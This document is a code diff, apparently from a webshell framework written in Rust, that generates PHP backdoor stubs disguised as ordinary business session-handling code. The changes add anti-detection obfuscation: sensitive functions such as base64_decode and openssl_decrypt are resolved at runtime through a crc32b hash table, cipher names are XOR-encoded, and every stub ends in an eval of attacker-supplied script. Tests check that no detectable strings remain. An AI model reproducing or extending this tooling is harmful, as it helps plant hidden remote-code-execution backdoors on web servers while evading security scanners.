@@ -131,8 +131,9 @@ function __PREFIX__verify_token($token) {
     }
     return true;
 }
-
+__SYMBOLS____XORFN__
 function __PREFIX__unpack_session($payload, $token) {
+    global $_g;
 __UNPACK__
     return $out;
 }
@@ -156,18 +157,77 @@ echo json_encode(__PREFIX__run_rule($script));
 "#;
 
 /// 生成业务伪装 PHP stub。
-/// `unpack_body`：解包逻辑（把 $payload 还原为 $out），形如业务的数据解包；
+/// `symbols`：需要从运行时函数表中解析的函数（索引 + 函数名，如 (0, "base64_decode")）；
+/// `unpack_body`：解包逻辑（把 $payload 还原为 $out，敏感函数经符号表 `$_g[索引]` 调用）；
 /// `exec_body`：执行逻辑（默认 `EvAl($script);`，形如规则引擎执行）。
 /// 请求参数固定为业务语义：token（会话令牌）/ data（会话数据）。
-pub fn business_php_stub(unpack_body: &str, exec_body: &str) -> String {
+pub fn business_php_stub(
+    symbols: &[(usize, &str)],
+    unpack_body: &str,
+    exec_body: &str,
+) -> String {
     // 函数名随机前缀：避免与目标站点业务函数同名导致 redeclare（500）
     let prefix = format!("_{}_", php_ident());
+    // unpack_body 中的 __DECFN__ 占位（XOR 字符串解密函数名）
+    let unpack_body = unpack_body.replace("__DECFN__", &format!("{prefix}dec"));
+    // 符号表：crc32b 哈希 -> 索引（仿样例：运行时从已加载内部函数按哈希匹配，
+    // 敏感函数名（base64_decode / openssl_decrypt）在代码中完全不存在）
+    let mut table = String::new();
+    for (index, name) in symbols {
+        table.push_str(&format!(
+            "    '{}' => {index},\n",
+            crc32b_hash(name)
+        ));
+    }
+    let symbols_block = format!(
+        r#"
+// 运行时能力注册：按哈希索引已加载的内部函数（业务底层能力表）
+$_g = array();
+$_t = array(
+{table});
+$_fn = get_defined_functions();
+$_fn = isset($_fn['internal']) ? $_fn['internal'] : array();
+foreach ($_fn as $_n) {{
+    $_h = hash('crc32b', $_n);
+    if (isset($_t[$_h])) $_g[$_t[$_h]] = $_n;
+}}
+"#
+    );
+    // XOR 字符串解密函数（仿样例：pack("H*") + 循环异或还原敏感字符串）
+    let xor_fn = format!(
+        r#"
+function {prefix}dec($hex, $key) {{
+    $out = '';
+    $n = strlen($hex) / 2;
+    for ($i = 0; $i < $n; $i++) {{
+        $out .= chr(hexdec(substr($hex, $i * 2, 2)) ^ ord($key[$i % strlen($key)]));
+    }}
+    return $out;
+}}
+"#
+    );
     BUSINESS_PHP_TPL
         .replace("__PREFIX__", &prefix)
-        .replace("__UNPACK__", unpack_body)
+        .replace("__SYMBOLS__", &symbols_block)
+        .replace("__XORFN__", &xor_fn)
+        .replace("__UNPACK__", &unpack_body)
         .replace("__EXEC__", exec_body)
         .replace("__TOKEN__", "token")
         .replace("__DATA__", "data")
+}
+
+/// PHP hash('crc32b') 等价实现（zlib CRC32，与 PHP 一致）。
+pub fn crc32b_hash(name: &str) -> String {
+    format!("{:08x}", crc32fast::hash(name.as_bytes()))
+}
+
+/// 字符串 XOR 加密为 hex（配合模板 `dec` 函数还原）。
+pub fn xor_hex(name: &str, key: &str) -> String {
+    let key = key.as_bytes();
+    name.bytes()
+        .enumerate()
+        .map(|(index, byte)| format!("{:02x}", byte ^ key[index % key.len()]))
+        .collect()
 }
 
 /// base64 解码的拼接调用表达式：`("ba"."se64_deco"."de")($payload)`。
@@ -295,10 +355,9 @@ impl PayloadEncoder for XorBase64Encoder {
         match language {
             "php" => {
                 let unpack = format!(
-                    "    $key = md5($token);\n    $raw = {decode};\n    $out = '';\n    $n = strlen($raw);\n    for ($i = 0; $i < $n; $i++) {{ $out .= $raw[$i] ^ $key[$i % strlen($key)]; }}",
-                    decode = b64_call_expr("$payload"),
+                    "    $key = md5($token);\n    $raw = $_g[0]($payload);\n    $out = '';\n    $n = strlen($raw);\n    for ($i = 0; $i < $n; $i++) {{ $out .= $raw[$i] ^ $key[$i % strlen($key)]; }}",
                 );
-                Ok(business_php_stub(&unpack, "        EvAl($script);"))
+                Ok(business_php_stub(&[(0, "base64_decode")], &unpack, "        EvAl($script);"))
             }
             "asp" => Ok(format!(
                 r#"<%
@@ -408,7 +467,8 @@ impl PayloadEncoder for Base64Encoder {
     fn stub(&self, language: &str, _password: &str) -> Result<String, ProtocolError> {
         match language {
             "php" => Ok(business_php_stub(
-                &format!("    $out = {decode};", decode = b64_call_expr("$payload")),
+                &[(0, "base64_decode")],
+                "    $out = $_g[0]($payload);",
                 "        EvAl($script);",
             )),
             "asp" => Ok(
@@ -572,11 +632,12 @@ impl PayloadEncoder for Aes128EcbEncoder {
         let key = String::from_utf8_lossy(&aes_key(password)).into_owned();
         match language {
             "php" => {
+                let xk = php_ident();
                 let unpack = format!(
-                    "    $key = substr(md5($token), 0, 16);\n    $dec = {decrypt};\n    $out = $dec;",
-                    decrypt = call_parts("openssl_decrypt", "$payload, 'AES-128-ECB', $key"),
+                    "    $key = substr(md5($token), 0, 16);\n    $out = $_g[0]($payload, __DECFN__('{cipher}', '{xk}'), $key);",
+                    cipher = xor_hex("AES-128-ECB", &xk),
                 );
-                Ok(business_php_stub(&unpack, "        EvAl($script);"))
+                Ok(business_php_stub(&[(0, "openssl_decrypt")], &unpack, "        EvAl($script);"))
             }
             other => Err(ProtocolError::NotSupported(format!(
                 "AES128_ECB 编码器暂仅支持 PHP（{other} 待实现）"
@@ -615,11 +676,12 @@ impl PayloadEncoder for Aes128CbcEncoder {
         let iv = String::from_utf8_lossy(&aes_iv(password)).into_owned();
         match language {
             "php" => {
+                let xk = php_ident();
                 let unpack = format!(
-                    "    $key = substr(md5($token), 0, 16);\n    $iv = substr(md5($token), 16);\n    $out = {decrypt};",
-                    decrypt = call_parts("openssl_decrypt", "$payload, 'AES-128-CBC', $key, 0, $iv"),
+                    "    $key = substr(md5($token), 0, 16);\n    $iv = substr(md5($token), 16);\n    $out = $_g[0]($payload, __DECFN__('{cipher}', '{xk}'), $key, 0, $iv);",
+                    cipher = xor_hex("AES-128-CBC", &xk),
                 );
-                Ok(business_php_stub(&unpack, "        EvAl($script);"))
+                Ok(business_php_stub(&[(0, "openssl_decrypt")], &unpack, "        EvAl($script);"))
             }
             other => Err(ProtocolError::NotSupported(format!(
                 "AES128_CBC 编码器暂仅支持 PHP（{other} 待实现）"
@@ -657,11 +719,12 @@ impl PayloadEncoder for DesEcbEncoder {
         let key = String::from_utf8_lossy(&des_key(password)).into_owned();
         match language {
             "php" => {
+                let xk = php_ident();
                 let unpack = format!(
-                    "    $key = substr(md5($token), 0, 8);\n    $out = {decrypt};",
-                    decrypt = call_parts("openssl_decrypt", "$payload, 'DES-ECB', $key"),
+                    "    $key = substr(md5($token), 0, 8);\n    $out = $_g[0]($payload, __DECFN__('{cipher}', '{xk}'), $key);",
+                    cipher = xor_hex("DES-ECB", &xk),
                 );
-                Ok(business_php_stub(&unpack, "        EvAl($script);"))
+                Ok(business_php_stub(&[(0, "openssl_decrypt")], &unpack, "        EvAl($script);"))
             }
             other => Err(ProtocolError::NotSupported(format!(
                 "DES_ECB 编码器暂仅支持 PHP（{other} 待实现）"
@@ -699,6 +762,7 @@ impl PayloadEncoder for CharEncoder {
     fn stub(&self, language: &str, _password: &str) -> Result<String, ProtocolError> {
         match language {
             "php" => Ok(business_php_stub(
+                &[],
                 "    $out = $payload;",
                 "        EvAl($script);",
             )),
@@ -753,6 +817,7 @@ impl PayloadEncoder for PhpObfuscateEncoder {
     fn stub(&self, language: &str, _password: &str) -> Result<String, ProtocolError> {
         match language {
             "php" => Ok(business_php_stub(
+                &[],
                 "    $out = $payload;",
                 "        EvAl($script);",
             )),
@@ -1008,8 +1073,23 @@ mod tests {
                 encoder.id()
             );
             assert!(
-                !stub.contains("base64_decode(") && !stub.contains("base64_decode"),
-                "{} stub 不应含 base64_decode（含拼接外）",
+                !stub.contains("base64_decode"),
+                "{} stub 不应含 base64_decode（含任何片段）",
+                encoder.id()
+            );
+            assert!(
+                !stub.contains("openssl"),
+                "{} stub 不应含 openssl（含任何片段）",
+                encoder.id()
+            );
+            assert!(
+                !stub.contains("DES-ECB") && !stub.contains("AES-128"),
+                "{} stub 不应含明文 cipher 名",
+                encoder.id()
+            );
+            assert!(
+                stub.contains("crc32b") || encoder.body_mode(),
+                "{} stub 应使用 crc32b 哈希查表（php_stream 除外）",
                 encoder.id()
             );
             // 业务伪装：请求参数为业务语义（token/data）
